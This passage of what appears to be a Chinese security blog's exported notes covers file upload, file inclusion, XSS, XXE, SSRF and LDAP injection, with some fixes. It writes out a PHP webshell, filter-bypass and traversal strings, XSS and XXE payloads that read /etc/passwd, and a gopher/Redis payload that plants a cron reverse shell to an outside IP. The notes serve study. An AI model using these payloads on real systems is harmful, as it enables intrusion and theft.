    <content type="text"><![CDATA[0x01 管道符管道符只能显示最后一个命令的正确输出结果，如图： 0x02 &amp;符号&amp;符号可以显示所有命令的正确输出结果 0x03 总结在命令执行的时候使用管道符不能看到中间命令的结果，因此需要视情况而定。]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[.htaccess攻击]]></title>
    <url>%2F2018%2F05%2F30%2Fhtaccess%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[0x01 前言有的时候由于各种名单的原因，可能我们只能上传任何php文件，而且还没有其他地方来解析成php，咋办？如果你能上传.htaccess文件的话，那么就很好办了。 0x02 .htaccess攻击建一个.htaccess 文件，里面的内容如下：123&lt;FilesMatch &quot;pino&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 这个时候就上传一个文件名字是pino，这个时候我们上传一个文件名字叫做pino的文件，不要后缀名，然后里面是一句话木马，用菜刀连接，可以成功！]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP文件上传漏洞]]></title>
    <url>%2F2018%2F05%2F30%2FPHP%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[0x01 文件上传漏洞文件上传漏洞顾名思义就是用户上传一个可执行的脚本文件，获得了执行服务器端命令的能力。通常，文件上传是getshell最常用、最直接的方式了。但是，文件上传本身是一个正常的业务需求，因此问题在于如何安全的上传。 0x02 文件上传的触发条件 上传的文件被Web容器解释执行 用户能够从web页面访问到被上传的文件（直接或间接） 用户上传的文件通常不能被网站程序压缩、修改内容 0x03 从防御的角度看上传通常防御文件上传漏洞是分几个点的，大体上就以下几方面 1. 客户端javascript校验 在浏览加载文件，但还未点击上传按钮时变弹出对话框，内容可能是“只允许上传xxx后缀名的文件”之类的，而此时并没有发送数据包。 绕过方法： 关闭浏览器的javascript功能 用burp抓包改后缀名 2. 检测MIME 类型 · 客户端判断：1$_FILES[&apos;myfile&apos;][&apos;type&apos;] == &apos;image/jpeg&apos; · 服务端判断：12$fileinfo = finfo_open(FILEINFO_MIME);$mimetype = finfo_file($fileinfo, $file_true_name); 绕过方法： 用burp抓包，修改Content-Type 3. 检查内容 服务器端会读取上传的文件然后判断文件内容时候有&lt;?php之类的 绕过方法： 1. 12&lt;script language=&quot;php&quot;&gt;eval($_POST[&apos;cmd&apos;]);&lt;/script&gt;` 如果检查文件头的话就就可以找张真正的图片然后用winhex在图片的末尾写php代码 4. 检查文件扩展名 一般检查文件扩展名为最直接有效的方法，通常是基于白名单或者黑名单来实现的。 黑名单绕过 可以使用能够被解析的其他文件扩展名 1234jsp jspx jspfasp asa cer aspxphp phtml php3 php4 php5 PHP phtmexe exee 特殊文件名绕过比如在上传的时候改成test.asp.或者test.asp_(下划线为空格，这里方便大家看用下划线表示了)，这种命名方式在windows下是不允许的，绕过验证后windows系统自动去掉后面的点和空格，但要注意Unix/Linux是没有这个特性的。 00截断有的时候可能会遇到服务器端把后缀名已经定好了，而恰好别的地方有一个可以任意读取php文件的服务，这个时候可以把图片马上传后在这里查看，查看的时候用%00把后面的.php给截断就好了 .htaccess文件攻击配合名单列表绕过，上传一个自定义.htaccess文件，即可轻松绕过各种检测。 解析漏洞绕过这类漏洞直接配合上传一个代码注入过的非黑名单文件即可，再利用解析漏洞即可 白名单绕过 %00截断跟之前说的很像，就是上传一个比如shell.php%00.jpg，服务器检测后缀名是.jpg，但实际上已经被截断了。 解析漏洞利用这类漏洞直接配合上传一个代码注入过的白名单文件即可，再利用解析漏洞 .htaccess文件攻击配合名单列表绕过，上传一个自定义.htaccess文件，即可轻松绕过 0x04 与文件上传息息相关的解析漏洞 IIS5.x-6.x解析漏洞 •使用iis5.x-6.x版本的服务器，大多为windowsserver2003，网站比较古老，开发语句一般为asp；该解析漏洞也只能解析asp文件，而不能解析aspx文件。 •目录解析(IIS6.0)，只要文件夹有asp的话，该目录下所有文件都会当作asp来解析1www.xxx.com/xx.asp/xx.jpg（xx.asp要存在） 1www.xxx.com/xx.asp;.jpg 服务器默认不解析;号后面的内容，因此xx.asp;.jpg便被解析成asp文件了。(xx.asp;.jpg为上传文件) IIS的PUT上传 PUT是在WebDav中定义的一个方法，允许用户上传文件到指定目录。在许多WebServer中都默认禁用了此方法，或者对上传做了严格限制。但在IIS中，如果目录支持写权限，同时开启了WebDav，就会支持PUT，再结合MOVE方法，可Getshell。 apache解析漏洞 Apache解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如test.php.owf.rar“.owf”和”.rar”这两种后缀是apache不可识别解析,apache就会把test.php.owf.rar解析成php 1www.xxxx.xxx.com/test.php.php123 Apache的httpd.conf的AddHandler php5-script .php这时只要文件名里包含.php即使文件名是test2.php.jpg也会以php来执行。（配置错误） nginx解析漏洞(Nginx&lt;8.03) •当cgi.fix_pathinfo开启时（为1） •当访问www.xx.com/phpinfo.jpg/1.php时，会将phpinfo.jpg当做php进行解析 •其中1.php是一个不存在的文件 0x05 参考 某大佬的PPT 文件上传框架]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>PHP</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP文件包含漏洞]]></title>
    <url>%2F2018%2F05%2F30%2FPHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[0x01 文件包含函数 include() include_once() require() require_once() 这里include()函数如果在包含的过程中发生错误，会发出警告，但是会继续执行后续代码；require()函数如果在包含的过程中发生错误，会报错退出，并且不再执行之后的代码。include_once()和require_once()的功能跟include()和require()类似，只不过前者如果已经包含了文件，那么就不会包含第二次，以免出现函数重定义或变量重赋值的问题。 以上四个函数不管包含的文件类型是什么，都会当作php文件进行解析，例如phpinfo.txt12&lt;?phpphpinfo(); lfi.php1234&lt;?php$temp=$_GET[&apos;c&apos;];include($temp);?&gt; 成功执行phpinfo()！ 0x02 文件包含分类1. LFI（本地文件包含） 本地文件包含就是包含服务器本地的文件。 2. RFI（远程文件包含） 远程文件包含就是包含远程服务器上的文件，这样我们就可以自定义自己想要执行的代码，因此危害比较大。远程文件包含需要一定的条件php.ini配置12allow_url_fopen=On（默认开启）allow_url_include=On（默认关闭） 0x03 php伪协议假设服务器lfi.php内容如下1234&lt;?php$temp = $_GET[&apos;c&apos;];include($temp);?&gt; php://input 使用条件12allow_url_include=On（默认关闭）allow_url_fopen不做要求（默认开启） php://filter 使用条件：无 ··？c=php://filter/read=convert.base64-encode/resource=xxx或者?c=php://filter/convert.base64-encode/resource=xxx···通过指定resource的值来读取文件，读取的文件是base64加密后的，读取到后解一下就好了。 phar://* 使用条件：php版本大于等于5.3.0 假设需要读取的文件是phpinfo.txt，将其压缩成zip文件（phpinfo.zip） 然后指定文件的绝对路径1?c=phar://C://wamp64/www/phpinfo.zip/phpinfo.txt 或者使用相对路径（这里phpinfo.zip就在当前路径）1?c=phar://phpinfo.zip/phpinfo.txt zip:// 使用条件：php版本大于等于5.3.0 zip://与phar://的使用类似，但是需要绝对路径， zip文件后面要跟%23加zip文件里的文件 1?c=zip://C:/wamp64/www/phpinfo.zip%23phpinfo.txt data:URL schema 使用条件：php版本大于等于5.2.0allow_url_include=On(默认关闭)allow_url_fopen=On(默认开启) 1?c=data:text/plain,&lt;?php phpinfo();?&gt; 或者1?c=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b session文件包含 使用条件：session文件路径已知，并且内容部分可控 session文件路径可以在phpinfo中session.save_path得到 一般情况下session文件都在/tmp目录下命名格式：sess_[phpsessid]，而phpsessid可以在cookie中得到 要包含并利用的话，需要能控制部分sesssion文件的内容。暂时没有通用的办法。有些时候，可以先包含进session文件，观察里面的内容，然后根据里面的字段来发现可控的变量，从而利用变量来写入payload，并之后再次包含从而执行php代码。 包含日志文件 使用条件： 需要知道日志文件的目录，并且日志文件可读 当我们访问服务器的时候，访问的请求会被记录到access.log，当发生错误的时候会把错误写入到error.log，一般日志的路径linux下是/var/logs/apache2，windows下wamp在/wamp/logs但是如果我们直接请求的话，一些特殊字符会被url编码从而导致包含后无法解析 可以用burp抓包后改包即可。 之后就可以包含进行利用啦 包含ssh-log 使用条件：ssh日志路径已知，并且可读，默认情况下在/var/log/auth.log 1ssh &apos;&lt;?php phpinfo(); ?&gt;&apos;@remotehost 之后密码随便写之后包含日志文件就好啦 environ 使用条件： php以cgi方式运行，这样environ才会保持UA头。 environ文件存储位置已知，且environ文件可读。 proc/self/environ中会保存user-agent头。如果在user-agent中插入php代码，则php代码会被写入到environ中。之后再包含它，即可。 条件竞争 0x04 绕过姿势指定前缀1234&lt;?php$file = $_GET[&apos;file&apos;];include &apos;/var/www/html/&apos;.$file;?&gt; 目录遍历 可以用../进行目录遍历，访问其他目录的文件 编码 但有的时候，服务器通常会把../过滤掉，这个时候可以用编码进行绕过利用url编码%2e%2e%5c..%5c%2e%2e\%2e%2e%2f..%2f%2e%2e/../..\ 二次编码%252e%252e%255c%252e%252e%252f../..\ 容器/服务器的编码方式../..%c0%af%c0%ae%c0%ae/注：Why does Directory traversal attack %C0%AF work? %c0%ae%c0%ae/注：java中会把”%c0%ae”解析为”\uC0AE”，最后转义为ASCCII字符的”.”（点）Apache Tomcat Directory Traversal..\..%c1%9c 指定后缀1234&lt;?php$file = $_GET[&apos;file&apos;];include $file.&apos;/test/test.php&apos;;?&gt; ?问号绕过1index.php?file=http://remoteaddr/remoteinfo.txt? 问号后面的部分/test/test.php，也就是指定的后缀被当作query从而被绕过。注意需要把#进行url编码为%23。 利用zip协议 可以构造跟后缀一样的路径，再打包成zip文件，然后利用zip协议包含即可]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>PHP</tag>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS防御说]]></title>
    <url>%2F2018%2F05%2F30%2FXSS%E9%98%B2%E5%BE%A1%E8%AF%B4%2F</url>
    <content type="text"><![CDATA[0x01 HTTP响应的X-头部1. x-frame-options x-frame-options的值有两个： deny（禁止被加载到任何frame中） sameorigin（仅允许被加载进同域内的frame） 2. x-xss-protection x-xss-protection的值有三个： 0（表示禁用这个策略） 1（默认，对危险脚本做一些标志或修改，以阻止在浏览器上渲染执行，Chrome和IE在这方面的行为是有差异的） 1;mode=block（强制不渲染，在Chrome下直接跳转到空白页，在IE下返回一个#符号） 这个策略仅针对反射型xss，对付不了存储型xss，能识别反射型是因为提交请求的URL中带有可疑的xss代码片段。 3. x-content-security-policy（俗称CSP） CSP策略由一些指令构成，每个指令以分号分隔，语法格式：1x-content-security-policy:[指令1][指令值1];[指令2][指令值2]... 指令分类： defualt-src（以下值中的单引号必须有） 该指令的值会影响一下所有指令，支持通配符来表明外部资源的来源 &apos;none&apos;表示一个空集合，即表示外部资源不允许被加载 &apos;self&apos;表示匹配同域的资源，即只有同域内的资源允许被加载 &apos;unsafe-inline&apos;表示允许内核的javascript/css，如&lt;script&gt;里的，javascript:里的、on事件里的、&lt;style&gt;事件里的等。 &apos;unsafe-eval&apos;表示允许eval/setTimeout/setInterval/Function等可以直接执行字符串的函数。除此之外，还有一个data指令值，允许data:协议。 **注意以上指令值都以空格分隔** script-src 表示脚本的来源，指令值同default-src object-src 表示&lt;object&gt;&lt;embed&gt;&lt;applet&gt;等对象的来源，指令值同default-src img-src 表示&lt;img&gt;的来源，指令值同default-src media-src 表示&lt;audio&gt;&lt;vedio&gt;的来源，指令值同default-src frame-src 表示&lt;frame&gt;&lt;iframe&gt;的来源，指令值同default-src font-src 表示@font-face字体的来源，指令值同default-src connect-src 表示XMLHttpRequest、WebSocket等跨域的来源，指令值同default-src style-src 表示样本来源，指令值同default-src]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS输出点总结]]></title>
    <url>%2F2018%2F05%2F30%2FXSS%E8%BE%93%E5%87%BA%E7%82%B9%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[0x01 HTML标签之间例如输出点：1&lt;div id=&quot;body&quot;&gt;[输出]&lt;/div&gt; 直接提交1&lt;script&gt;alert(1)&lt;/script&gt; 即可触发XSS，但是当标签是不能执行脚本的标签 总结那么就得先把那个标签闭合，然后在注入XSS语句，例如1&lt;/textarea&gt;&lt;script&gt;alert(1)&lt;/script&gt; 0x02 HTML标签之内例如输入点：1&lt;input type=&quot;text&quot; value=&quot;[输出]&quot;/&gt; 两种方法： 闭合属性，然后用on时间来触发脚本 1&quot; onmouseover=alert(1) x=&quot; 闭合属性后闭合标签，然后直接执行脚本 1&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt; 还有一些特殊的场景：1&lt;input type=&quot;hiden&quot; value=&quot;[输出]&quot; /&gt; 这里只能把input标签闭合，然后直接执行脚本，否则会因为type为hidden导致无法执行脚本1&lt;input value=&quot;[输出点]&quot; type=&quot;hidden&quot;/&gt; 但是这里可以输入11&quot; onmouseover=alert(1) type=&quot;text 输出变为1&lt;input value=&quot;1&quot; onmouseover=alert(1) type=&quot;text&quot; type=&quot;hidden&quot; /&gt; 这时候的输出就不再是隐藏表单了，而是标准输入框 再比如这两类场景： 输出在src/href/action等属性内，比如1&lt;a href=&quot;[输出]&quot;&gt;click me &lt;/a&gt; 除了各种闭合标签外，还可以12javascript:alert(1)//data:text/html;base64,(base64字符串) 前提是我们提交的payload必须出现在这些属性值的开头部分（data:协议的必须作为整个属性值出现，IE不支持） 对于javascript:alert(1)//来说，如果网站把注释符//过滤了，那么我们还可以用javascript逻辑与算数运算符，因为JavaScript是弱类型语言，字符串与字符串之间的各种运算是合法的，可以用12&lt;a href=&quot;javascript:alert(1) - html&quot;&gt;click me&lt;/a&gt;window.onerror=function()&#123;return true;&#125; //抑制错误 输出在on*事件内，比如1&lt;a href=&quot;#&quot; onclick=&quot;[输出]&quot;&gt;click me&lt;/a&gt; on*事件是可以执行javascript脚本的。 0x03 成为Javascript代码的值例如1&lt;script&gt;a=&quot;[输出]&quot;;...&lt;/script&gt; 此时我们可以闭合标签1&lt;/script&gt;&lt;script&gt;alert(1)// 也可以闭合a变量的值1&quot;;alert(1);// 0x04 成为CSS代码的值打开就是利用expression关键词来执行脚本]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[转载-安全脉搏漏洞挖掘小记]]></title>
    <url>%2F2018%2F05%2F30%2F%E8%BD%AC%E8%BD%BD-%E5%AE%89%E5%85%A8%E8%84%89%E6%90%8F%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%B0%8F%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[0x01 前言 以前没有漏洞挖掘实践的经验，最近XMAN要求进行漏洞挖掘，所以遇到漏洞挖掘笔记还是要记录一下滴…没转载过，直接放链接好了http://byd.dropsec.xyz/2017/08/07/%E5%AE%89%E5%85%A8%E8%84%89%E6%90%8F%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%B0%8F%E8%AE%B0/#more]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>SSRF</tag>
        <tag>漏洞挖掘</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XXE漏洞攻击与防御]]></title>
    <url>%2F2018%2F05%2F30%2FXXE%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1%2F</url>
    <content type="text"><![CDATA[0x01 XML基础在聊XXE之前，先说说相关的XML知识吧。 定义XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。 文档结构XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。1234567891011121314151617&lt;!--XML声明--&gt;&lt;?xml version=&quot;1.0&quot;?&gt; &lt;!--文档类型定义--&gt;&lt;!DOCTYPE note [ &lt;!--定义此文档是 note 类型的文档--&gt;&lt;!ELEMENT note (to,from,heading,body)&gt; &lt;!--定义note元素有四个元素--&gt;&lt;!ELEMENT to (#PCDATA)&gt; &lt;!--定义to元素为”#PCDATA”类型--&gt;&lt;!ELEMENT from (#PCDATA)&gt; &lt;!--定义from元素为”#PCDATA”类型--&gt;&lt;!ELEMENT head (#PCDATA)&gt; &lt;!--定义head元素为”#PCDATA”类型--&gt;&lt;!ELEMENT body (#PCDATA)&gt; &lt;!--定义body元素为”#PCDATA”类型--&gt;]]]&gt;&lt;!--文档元素--&gt;&lt;note&gt;&lt;to&gt;Dave&lt;/to&gt;&lt;from&gt;Tom&lt;/from&gt;&lt;head&gt;Reminder&lt;/head&gt;&lt;body&gt;You are a good man&lt;/body&gt;&lt;/note&gt; DTDXML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。内部声明DTD:1&lt;!DOCTYPE 根元素 [元素声明]&gt; 引用外部DTD:1&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt; DTD中的一些重要的关键字： DOCTYPE（DTD的声明） ENTITY（实体的声明） SYSTEM、PUBLIC（外部资源申请） 实体类别介绍实体主要分为一下四类 内置实体 (Built-in entities) 字符实体 (Character entities) 通用实体 (General entities) 参数实体 (Parameter entities) 参数实体用%实体名称申明，引用时也用%实体名称;其余实体直接用实体名称申明，引用时用&amp;实体名称。参数实体只能在DTD中申明，DTD中引用；其余实体只能在DTD中申明，可在xml文档中引用。 举例：内部实体1&lt;!ENTITY 实体名称 &quot;实体内容&quot;&gt; 外部实体1&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt; 参数实体123&lt;!ENTITY % 实体名称 &quot;实体内容&quot;&gt;或者&lt;!ENTITY % 实体名称 &quot;URI&quot;&gt; 注意：参数实体是在DTD中被引用的，而其余实体是在xml文档中被引用的。 外部实体默认协议 PHP扩展协议 举例：12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE a [&lt;!ENTITY passwd &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;foo&gt; &lt;value&gt;&amp;passwd;&lt;/value&gt;&lt;/foo&gt; 0x02 XXE漏洞XXE就是XML外部实体注入。当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。 举例 恶意引入外部实体(1) 12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE a [&lt;!ENTITY passwd SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;a&gt; &lt;value&gt;&amp;passwd;&lt;/value&gt;&lt;/a&gt; 恶意引入外部实体(2) 1234567**XML内容**&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE a [ &lt;!ENTITY % f SYSTEM &quot;http://www.m03.com/evil.dtd&quot;&gt; %d;]&gt;&lt;aaa&gt;&amp;b;&lt;/aaa&gt; DTD文件内容1&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt; 恶意引入外部实体(3) XML文件内容12345&lt;?xml verstion=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE a[ &lt;!ENTITY f SYSTEM &quot;http://www.m03.com/evil.dtd&quot;&gt;]&gt;&lt;a&gt;&amp;b;&lt;/a&gt; DTD文件内容1&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt; XXE的危害 读取任意文件- 有回显 XML.php1234567891011&lt;?php $xml = &lt;&lt;&lt;EOF&lt;?xml version = &quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY f SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;x&gt;&amp;f;&lt;/x&gt;EOF;$data = simplexml_load_string($xml);print_r($data);?&gt; 访问XML.php可以读取etc/passwd文件内容 - 无回显 当页面没有回显的话，可以将文件内容发送到远程服务器，然后读取。12345678&lt;?xml verstion=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE a[ &lt;!ENTITY % f SYSTEM &quot;http://www.m03.com/evil.dtd&quot;&gt; %f;]&gt;&lt;a&gt;&amp;b;&lt;/a&gt;$data = simplexml_load_string($xml);print_r($data); 远程服务器的evil.dtd文件内容1&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt; 命令执行 php环境下，xml命令执行要求php装有expect扩展。而该扩展默认没有安装。1234567891011&lt;?php $xml = &lt;&lt;&lt;EOF&lt;?xml version = &quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY f SYSTEM &quot;except://ls&quot;&gt;]&gt;&lt;x&gt;&amp;f;&lt;/x&gt;EOF;$data = simplexml_load_string($xml);print_r($data);?&gt; 内网探测/SSRF 由于xml实体注入攻击可以利用http://协议，也就是可以发起http请求。可以利用该请求去探查内网，进行SSRF攻击。 0x03 XXE漏洞修复与防御 使用开发语言提供的禁用外部实体的方法PHP1libxml_disable_entity_loader(true); JAVA12DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false); Python12from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False)) 过滤用户提交的XML数据过滤关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC。 ##0x04 遗留问题(已解决) 以上测试在php5.4一下包括5.4是成功的，php5.5及以上是不成功的。可能的原因是5.5以上版本后，simplexml_load_string()、DOMDocument::loadxml()等不解析外部实体导致都不到文件还是因为libxml2版本的问题，还是高版本的php本身默认不解析外部实体呢，还是其他神恶魔原因呢？如果是因为php本身问题，那么XXE的利用范围也太过小了吧，应该不是这样的。。但是讲道理网上的资料太老了吧，估计也是参考别人的自己没有试验吧，等有空再做实验看看是什么问题。（2017.9.20更新）今天在弄phith0n的vulhub的时候，无意间看到php-xxe的项目，得到了我想要的结果。XXE的利用跟php版本没有关系，而是xmllib的版本问题，xmllib2.9.0以后，是默认不解析外部实体的。 ##0x05 参考文献 https://security.tencent.com/index.php/blog/msg/69http://php.yjsweb.cn/php/68075544811183197241.htmlhttps://thief.one/2017/06/20/1/]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>XXE</tag>
        <tag>XML注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SSRF漏洞攻击与防御]]></title>
    <url>%2F2018%2F05%2F30%2FSSRF%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1%2F</url>
    <content type="text"><![CDATA[0x01 概述SSRF(Server-side Request Forge, 服务端请求伪造)。由攻击者构造的攻击链接传给服务端执行造成的漏洞，一般用来在外网探测或攻击内网服务。 0x02 SSRF的危害 扫内网 向内部任意主机的任意端口发送精心构造的Payload DOS攻击（请求大文件，始终保持连接Keep-Alive Always） 攻击内网的web应用，主要是使用GET参数就可以实现的攻击（比如struts2，sqli等） 利用file协议读取本地文件等 0x03 漏洞利用CURL支持协议 本地利用 123456789# dict protocol (操作Redis)curl -vvv &apos;dict://127.0.0.1:6379/info&apos;# file protocol (任意文件读取)curl -vvv &apos;file:///etc/passwd&apos;# gopher protocol (一键反弹Bash)# * 注意: 链接使用单引号，避免$变量问题curl -vvv &apos;gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/103.21.140.84/6789 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a&apos; 远程利用 漏洞代码testssrf.php（未作任何SSRF防御）1234567891011&lt;?phpfunction curl($url)&#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_HEADER, 0); curl_exec($ch); curl_close($ch); &#125;$url = $_GET[&apos;url&apos;];curl($url);?&gt; 利用file协议读取文件 利用dict协议查看端口开放当端口开放的时候 当端口未开放的时候 回显 利用gopher协议反弹shell 待更新。。。 漏洞代码testssrf2.php限制了只能使用HTTP,HTTPS，设置跳转重定向为True（默认不跳转）12345678910111213141516&lt;?php function curl($url)&#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, True);//限制为HTTP,HTTPS curl_setopt($ch,CURLOPT_PROTOCOLS,CURLPROTO_HTTP|CURLPROTO_HTTPS); curl_setopt($ch, CURLOPT_HEADER, 0); curl_exec($url); curl_close();&#125;$url = $_GET[&apos;url&apos;];curl($url); ?&gt; 此时用file、dict等协议就没有用了。此时可以利用302跳转进行利用1234567891011&lt;?php$schema = $_GET[&apos;s&apos;];$ip = $_GET[&apos;i&apos;];$port = $_GET[&apos;p&apos;];$query = $_GET[&apos;q&apos;];if(empty($port))&#123; header(&quot;Location: $schema://$ip/$query&quot;);&#125;else&#123; header(&quot;Location: $schema://$ip:$port/$query&quot;);&#125;?&gt; 0x04 漏洞代码curl造成的SSRF12345678910function curl($url)&#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_HEADER, 0); curl_exec($ch); curl_close($ch);&#125;$url = $_GET[&apos;url&apos;];curl($url); file_get_contents造成的SSRF12$url = $_GET[&apos;url&apos;];echo file_get_contents($url); fsockopen造成的SSRF12345678910111213141516171819&lt;?phpfunction Getfile($host, $port, $link)&#123; $fp = fsockopen($host, intval($port), $errno, $errstr, 30); if(!$fp)&#123; echo &quot;$errstr (error number $errno) \n&quot;; &#125;else&#123; $out = &quot;GET $link HTTP/1.1\r\n&quot;; $out .= &quot;HOST $host \r\n&quot;; $out .= &quot;Connection: Close\r\n\r\n&quot;; $out .= &quot;\r\n&quot;; fwrite($fp, $out); $content = &apos;&apos;; while(!feof($fp))&#123; $contents .= fgets($fp, 1024); &#125; fclose($fp); return $contents; &#125;&#125; 0x05 常见的过滤与绕过常见的过滤 过滤开头不是http://xxx.com的所有链接 过滤格式为ip的链接，比如127.0.0.1 结尾必须是某个后缀 绕过方法 http基础认证http://xxx.com@attacker.com 利用302跳转（xip.io，www.tinyrul.com）2.1 当我们访问xip.io的子域，比如127.0.0.1.xip.io的时候，实际上会被自动重定向到127.0.0.12.2 如果利用上面的方法会被检测127.0.0.1的话，可以利用www.tinyurl.com提供的服务来进行绕过 加上#或?即可 4.更改其他进制的ip 0x06 修复方案修复方案： • 限制协议为HTTP、HTTPS • 不用限制302重定向 • 设置URL白名单或者限制内网IP]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>SSRF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LDAP注入漏洞与防御]]></title>
    <url>%2F2018%2F05%2F30%2FLDAP%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E4%B8%8E%E9%98%B2%E5%BE%A1%2F</url>
    <content type="text"><![CDATA[0x01 前言前两天爆了一个LDAP漏洞，据说存在了8年现在才被发现，感概一下，不知这8年来有多少站被搞了。。。想着复现这个漏洞，就先复习一下LDAP注入的相关知识吧，差了很多资料，记一下笔记。 0x02 LDAP介绍在学习LDAP注入之前，首先要了解LDAP的运行机制。什么是LDAP？LDAP(Lightweight Directory Access Protocol):轻量级目录访问协议，是一种在线目录访问协议。LDAP主要用于目录中资源的搜索和查询，是X.500的一种简便的实现。简单来说，可以理解为LDAP是某种搜索协议，就像我们熟知的数据库一样，我们利用SQL语句进行查询数据库中的数据。而LDAP也有一套自己的查询语句，来进行查询。 LDAP查询语法12search语法：attribute operator valuesearch filter options:( &quot;&amp;&quot; or &quot;|&quot; (filter1) (filter2) (filter3) ...) (&quot;!&quot; (filter)) LDAP的搜索语法其实很容易，这里看不明白的话，往下看一下具体实例就会明白的。 0x03 LDAP注入攻击轻量级目录访问协议是通过TCP/IP查询和修改目录服务的协议，使用最广泛的LDAP服务如微软的ADAM(Active Directory Application Mode)和OpenLDAP。 1(&amp;(attribute=value)(injected_filter)) (second_filter) 需要注意的是，在OpenLDAP中，第二个过滤器会被忽略，只有第一个会被执行，那么类似上面的这种注入就可以成功的。而在ADAM中，有两个过滤器的查询是不被允许的，那么这种注入是没什么用的。 AND LDAP注入 当后端的代码如下1(&amp;(parameter1=value1)(parameter2=value2)) 这里value1和value2都会被查询，其中value1和value2是用户可控的，如果过滤不完善，就会存在LDAP注入的可能。比如一个用户登录的场景，用户输入username和password，应用会构造一个过滤器并发给LDAP服务器进行查询。1(&amp;(username=uname)(password=pwd)) 当用户输入一个有效的用户名，例如admin，那么就有可能在username字段后面进行注入，从而在不知道密码的情况下进行登陆。12payload: admin)(&amp;))result: 